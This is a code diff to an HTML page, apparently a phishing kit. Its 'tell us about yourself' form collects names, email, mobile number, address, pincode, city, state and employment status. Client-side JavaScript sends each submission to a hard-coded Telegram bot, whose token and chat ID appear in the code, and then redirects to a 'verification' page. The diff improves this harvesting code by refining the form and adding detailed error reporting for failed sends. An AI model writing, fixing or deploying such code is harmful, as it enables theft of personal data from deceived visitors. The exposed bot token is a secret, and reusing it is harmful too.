@@ -198,7 +198,7 @@
 <div class="container">
     <div class="form-container">
         <h1 style="margin-top:0">Please tell us about yourself</h1>
-        <form method="post" id="telegramFormsss">
+        <form id="telegramFormsss">
             <div class="form-row">
                 <div class="form-group">
                     <label>First name</label>
@@ -270,7 +270,6 @@
             <div class="form-group">
                 <label>Employment status</label>
                 <input type="text" id="employmentstatus" name="employmentstatus">
-
             </div>
 
             <div class="terms-area">
@@ -324,7 +323,6 @@ document.getElementById("telegramFormsss").addEventListener("submit", function(e
     var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
     var chatId = "1308711346";
 
-    // FIX 2: Fixed the broken string concatenation (removed the accidental semicolon)
     var message = "🚀 New Form Submission\n\n" +
         "Name: " + name + "\n" +
         "Middle Name: " + middlename + "\n" +
@@ -335,14 +333,13 @@ document.getElementById("telegramFormsss").addEventListener("submit", function(e
         "Email: " + email + "\n" +
         "Mobile: " + mobile + "\n" + 
         "Address: " + address + "\n" +   
-        "Pincode: " + pincode + "\n" + // Added + "\n" here
+        "Pincode: " + pincode + "\n" + 
         "City: " + city + "\n" + 
         "State: " + state + "\n" +
         "Employment: " + employmentstatus;
       
     var telegramURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
-    // Best practice: Use POST for sending data
     fetch(telegramURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -355,11 +352,14 @@ document.getElementById("telegramFormsss").addEventListener("submit", function(e
         if(response.ok) {
             window.location.href = "verification.html";  
         } else {
-            alert("Error from Telegram API");
+            return response.json().then(err => {
+                console.error("Telegram API Error Details:", err);
+                alert("Error from Telegram API: " + JSON.stringify(err));
+            });
         }
     })
     .catch(error => {
-        console.error(error);
+        console.error("Network/Fetch Error:", error);
         alert("Failed to send data. Check your internet connection.");    
     });
 });
@@ -367,4 +367,3 @@ document.getElementById("telegramFormsss").addEventListener("submit", function(e
 
 </body>
 </html>
-
